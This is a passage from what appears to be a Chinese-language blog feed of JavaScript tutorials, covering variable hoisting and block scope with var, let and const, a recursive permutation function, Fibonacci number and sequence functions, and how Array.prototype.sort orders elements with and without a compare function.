<span class="token string">'全局'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> aa <span class="token operator">=</span> <span class="token string">'局部'</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>aa<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token string">'全局'</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> bb <span class="token operator">=</span> <span class="token string">'块级'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> bbb <span class="token operator">=</span> <span class="token string">'块级'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> c <span class="token operator">=</span> <span class="token string">'全局'</span>    <span class="token keyword">let</span> cc <span class="token operator">=</span> <span class="token string">'块级'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> ccc <span class="token operator">=</span> <span class="token string">'块级'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// “全局”</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// “局部”</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>aa<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// aa is not defined</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// “全局” “全局”</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>bb<span class="token punctuation">,</span> cc<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// bb is not defined  cc is not defined</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>bbb<span class="token punctuation">,</span> ccc<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// bbb is not defined  ccc is not defined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出，var 的<strong>局部</strong>限于全局或者函数内部上下文，而 let 和 const 的<strong>块级</strong>的意思则是被 <strong>块(block)</strong> 所包含的上下文，也就是包含在花括号 <code>&#123;&#125;</code> 内部的作用域中，所以也包括函数在内，加上 if, for, while, switch 等情况，且不能被外部作用域访问；</p><h2 id="全局变量提升"><a href="#全局变量提升" class="headerlink" title="全局变量提升"></a>全局变量提升</h2><p>首先看申明全局变量时的提升行为：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// ReferenceError: a is not defined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>证明不带关键字的申明全局变量，似乎并没有执行变量的提升行为，与以下代码的执行无异：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// a 前面未申明</span><span class="token comment">// ReferenceError: a is not defined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="局部变量提升"><a href="#局部变量提升" class="headerlink" title="局部变量提升"></a>局部变量提升</h2><p>使用关键字 <code>var</code> 申明的情况：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>aa<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> aa <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// undefined</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前面已解释，不再赘述，只是需要注意下面这种情况：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正常思维可能会理解 if 条件判断为假所以不会执行内部语句，最后会输出 <code>a is not defined</code>，然而并非如此，仍然将申明的变量执行了提升机制；这里可以简单理解为<strong>存在即提升</strong>，也就是为了避免以上问题的影响，所以出现了块级变量申明 <code>let</code> 与 <code>const</code>；</p><h2 id="块级变量提升"><a href="#块级变量提升" class="headerlink" title="块级变量提升"></a>块级变量提升</h2><p>使用 <code>let</code> 与 <code>const</code> 的情况：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>aa<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ReferenceError: Cannot access 'a' before initialization</span><span class="token comment">// ReferenceError: aa is not defined</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> b <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>bb<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ReferenceError: Cannot access 'b' before initialization</span><span class="token comment">// ReferenceError: bb is not defined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出，块级变量申明似乎也执行了类似提升的机制，但是处理却与 <code>var</code> 有区别，这里是直接以错误的形式处理输出，提示该变量未进行初始化，而没有变量的申明语句的情况，则是提示未定义的错误，且 <code>let</code> 与 <code>const</code> 的处理情况一致；</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提升 hoisting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 实现元素全排列</title>
      <link href="/2024/09/27/javascript/javascript-shi-xian-yuan-su-quan-pai-lie/"/>
      <url>/2024/09/27/javascript/javascript-shi-xian-yuan-su-quan-pai-lie/</url>
      
        <content type="html"><![CDATA[<h1 id="排列-Permutation-Arrangement"><a href="#排列-Permutation-Arrangement" class="headerlink" title="排列 (Permutation / Arrangement)"></a>排列 (Permutation / Arrangement)</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>n 个不同元素中任意选取 m (m &lt;= n) 个元素进行排列，所有排列情况的个数叫做 <strong>排列数</strong>，其值等于：</p><pre class="line-numbers language-none"><code class="language-none">A &#x3D; n! &#x2F; (n - m)!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>!</code> 表示数学中的阶乘运算符，可以通过以下函数实现：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">factorial</span><span class="token punctuation">(</span><span class="token parameter">n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">||</span> n <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> n <span class="token operator">*</span> <span class="token function">factorial</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">factorial</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 24</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当 n = m 时，称为 <strong>全排列</strong>，其值等于：</p><pre class="line-numbers language-none"><code class="language-none">A &#x3D; n!&#96;&#96;&#96;    全排列相当于将**所有元素**进行排序，得到所有不同顺序情况的个数；## 分析利用阶乘函数，通过上述数学公式只能得到所有情况的个数值，不容易得到具体的每种情况，要获取每种情况的输出值的话需要另寻他法；用数组举例分析：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>全排列：</p><pre><code>[1, 2, 3] =&gt; [                              [1, 2, 3],                 [1, 3, 2],                 [2, 1, 3],                 [2, 3, 1],                 [3, 1, 2],                 [3, 2, 1]             ]                        共 6 种情况树状图表示：  1       2       3 / \     / \     / \2   3   1   3   1   2|   |   |   |   |   |3   2   3   1   2   1   =&gt;  6 </code></pre><p>3 个元素中选取 2 个时：(n = 3, m = 2)</p><pre><code>[1, 2, 3] =&gt; [                              [1, 2],                 [1, 3],                 [2, 1],                 [2, 3],                 [3, 1],                 [3, 2]             ]                        共 6 种情况树状图表示：  1       2       3 / \     / \     / \2   3   1   3   1   2   =&gt;  6</code></pre><pre class="line-numbers language-none"><code class="language-none">## 实现&#96;&#96;&#96;jslet arr &#x3D; [1, 2, 3];&#x2F;*参数 a 为输入数组，元素个数 n 为 a 的长度，选取个数为 m；*&#x2F;function permutation(a, m) &#123;    &#x2F;&#x2F; 保存最终输出结果    let result &#x3D; [];        &#x2F;&#x2F; 定义 m 值默认等于 n，即全排列    let n &#x3D; a.length;    m &#x3D; m || n;        &#x2F;&#x2F; 定义递归函数保存结果到数组中    &#x2F;&#x2F; _a 为输入数组，    &#x2F;&#x2F; tmpResult 为保存单个情况结果的数组    function recur(_a, tmpResult &#x3D; []) &#123;        if (tmpResult.length &#x3D;&#x3D;&#x3D; m) &#123;                    &#x2F;&#x2F; 结果达到 m 个时保存结果，            &#x2F;&#x2F; 停止递归并进入下一次遍历            result.push(tmpResult);                    &#125; else &#123;            for (let i &#x3D; 0; i &lt; _a.length; i++) &#123;                                &#x2F;&#x2F; 复制一份输入数组，防止引用值被改变                let tmpA &#x3D; _a.concat();                            &#x2F;&#x2F; 复制一份保存结果的数组，防止每次遍历相互影响                let _tmpResult &#x3D; tmpResult.concat();                                &#x2F;&#x2F; 保存当前遍历值                _tmpResult.push(tmpA[i]);                                &#x2F;&#x2F; 删除当前遍历值，传递参数进入下一层递归                tmpA.splice(i, 1);                recur(tmpA, _tmpResult);            &#125;        &#125;    &#125;        &#x2F;&#x2F; 开始执行递归，然后返回最后结果    recur(a);    return result;&#125;console.log(permutation(arr));&#x2F;&#x2F; 3 个数全排列：&#x2F;*[                  [1, 2, 3],     [1, 3, 2],     [2, 1, 3],     [2, 3, 1],     [3, 1, 2],     [3, 2, 1]]*&#x2F;console.log(permutation(arr, 2));&#x2F;&#x2F; 3 个数中选取 2 个数排列：&#x2F;*[                  [1, 2],     [1, 3],     [2, 1],     [2, 3],     [3, 1],     [3, 2]]*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终实现函数就是 <code>permutation(a, m)</code>，其中参数 <code>a</code> 为输入数组，包含需要排列的所有元素，参数 <code>m</code> 为选取需要排列的个数，默认等于输入数组的长度，即默认全排列，注意 <code>m</code> 不能大于元素个数；</p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>以上函数输出值为一个二维数组，如果需要便于观察，输出一个一维数组，可以定义一个合并函数：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> arr<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">x</span> <span class="token operator">=></span> x<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token function">permutation</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// [123, 132, 213, 231, 312, 321]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 全排列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 实现斐波那契数列（Febonacci Array）</title>
      <link href="/2024/09/27/javascript/javascript-shi-xian-fei-bo-na-qi-shu-lie-febonacci-array/"/>
      <url>/2024/09/27/javascript/javascript-shi-xian-fei-bo-na-qi-shu-lie-febonacci-array/</url>
      
        <content type="html"><![CDATA[<p>斐波那契（Febonacci）数列是一个神奇的数列，在很多地方都有应用，可以自行搜索相关图片体会其魅力，这里不赘述，直接来分析一下如何通过 JavaScript 来实现；</p><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>斐波那契数列形式如下：</p><pre class="line-numbers language-none"><code class="language-none">1 1 2 3 5 8 13 21 34...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>规律应该很容易看出来，即从第三项开始，每一项的值等于前两项之和，以此类推下去，至于第一项和第二项的值嘛，不要纠结，就是这样规定的…</p><h1 id="斐波那契数"><a href="#斐波那契数" class="headerlink" title="斐波那契数"></a>斐波那契数</h1><p>首先来实现一下获取指定项的斐波那契数，即获取该数组中第 n 项的值；</p><p>方法一：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getFebNum</span><span class="token punctuation">(</span><span class="token parameter">n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">||</span> n <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">getFebNum</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">getFebNum</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>方法一使用递归的思路，便于理解代码量也少，但是其算法复杂度较大，当 n 相当大的时候，程序运行也无比复杂；</p><p>方法二：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">_getFebNum</span><span class="token punctuation">(</span><span class="token parameter">n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> one <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token comment">// 初始为第 -2 项</span>        two <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment">// 初始为第 -1 项</span>        three <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 初始为第 1 项</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        three <span class="token operator">=</span> one <span class="token operator">+</span> two<span class="token punctuation">;</span>         one <span class="token operator">=</span> two<span class="token punctuation">;</span>        two <span class="token operator">=</span> three<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> three<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种方法算法复杂度就比较小了，只是换了个获取思路，代码量增加也不太容易理解，其中为了缩减代码量，便于递推的进行，把斐波那契数列向后模拟扩展了两项:</p><table><thead><tr><th>项</th><th>-2</th><th>-1</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>…</th></tr></thead><tbody><tr><td>值</td><td>1</td><td>0</td><td>1</td><td>1</td><td>2</td><td>3</td><td>5</td><td>…</td></tr></tbody></table><h1 id="斐波那契数列"><a href="#斐波那契数列" class="headerlink" title="斐波那契数列"></a>斐波那契数列</h1><p>接下来通过代码实现获取指定长度的斐波那契数列： </p><p>方法一：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getFebArr</span><span class="token punctuation">(</span><span class="token parameter">n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">getFebNum</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个方法通过挨个获取斐波那契数，最后组成一个斐波那契数列，需要用到前面的 <code>getFebNum</code> 函数；</p><p>方法二：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">_getFebArr</span><span class="token punctuation">(</span><span class="token parameter">n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token keyword">let</span> one <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>        two <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>        three <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        three <span class="token operator">=</span> one <span class="token operator">+</span> two<span class="token punctuation">;</span>        arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>three<span class="token punctuation">)</span><span class="token punctuation">;</span>        one <span class="token operator">=</span> two<span class="token punctuation">;</span>        two <span class="token operator">=</span> three<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>方法二利用之前 <code>_getFebNum</code> 方法的思路，递推地填充斐波那契数列，降低了算法复杂度；</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 斐波那契 febonacci </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 数组排序详解</title>
      <link href="/2024/09/27/javascript/javascript-shu-zu-pai-xu-xiang-jie/"/>
      <url>/2024/09/27/javascript/javascript-shu-zu-pai-xu-xiang-jie/</url>
      
        <content type="html"><![CDATA[<p>提到 JavaScript 中对数组进行排序操作，可能首先想到的就是 <code>Array.prototype.sort()</code> 这个函数，比如以下场景就比较常见：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// [1, 2, 3]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// sort() 函数会修改原数组</span><span class="token comment">// [1, 2, 3]</span>arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ["A", "B", "a", "b", "c"]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和预想的一样，<code>sort()</code> 函数默认将数组元素升序排列，但是不要被上面的数字数组的排序结果迷惑，该函数并不是按照数字递增的方式排列的，而是按照元素的 <strong>ASCII</strong> 码或者 <strong>Unicode</strong> 码进行排序，比如字符 <code>a</code> 对应的 <strong>ASCII</strong> 码要比字符 <code>b</code> 的小，所以 <code>a</code> 排在 <code>b</code> 前面，同样字符 <code>A</code> 的比字符 <code>a</code> 的小，所以大写字母 <code>A</code> 会排在小写字母 <code>a</code> 前面；考虑以下情景：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// [1, 11, 12, 2]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>是不是有些和预想的不一样，这也验证了之前所说，并不是按照数字递增在排序，而是把数组中的数字类型的元素转换成字符，在拆分字符比较单个字符对应的字符码的大小；</p><h2 id="比较函数"><a href="#比较函数" class="headerlink" title="比较函数"></a>比较函数</h2><p>那么问题就来了，要按照数字递增方式排序，该怎么操作呢？其实这种情况早就被 <code>.sort()</code> 函数考虑到了，只是可能被大家忽略了，就是 <code>.sort()</code> 函数还能接受一个参数，叫做 <code>compareFunction</code>，顾名思义，就是 <strong>比较函数</strong>，由于该参数是一个函数，所以该函数又能接受两个参数，即比较的值，所以最终就是 <code>.sort(compareFunction(a, b))</code>；</p><p>关于这个 <strong>比较函数</strong>，存在如下规则：</p><ul><li>如果 <code>compareFunction(a, b)</code> 返回值小于 0 ，那么 <code>a</code> 会被排列到 <code>b</code> 之前；</li><li>如果 <code>compareFunction(a, b)</code> 返回值等于 0 ，那么 <code>a</code> 和 <code>b</code> 的相对位置不变；<ul><li>备注： ECMAScript 标准并不保证这一行为，而且也不是所有浏览器都会遵守（例如 Mozilla 在 2003 年之前的版本）；</li></ul></li><li>如果 <code>compareFunction(a, b)</code> 返回值大于 0 ，那么 <code>b</code> 会被排列到 <code>a</code> 之前；</li></ul><blockquote><p><code>compareFunction(a, b)</code> 必须总是对相同的输入返回相同的比较结果，否则排序的结果将是不确定的。</p></blockquote><p>在使用它之前，先来看看函数里面的参数 <code>a, b</code> 是如何对应数组元素的：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span 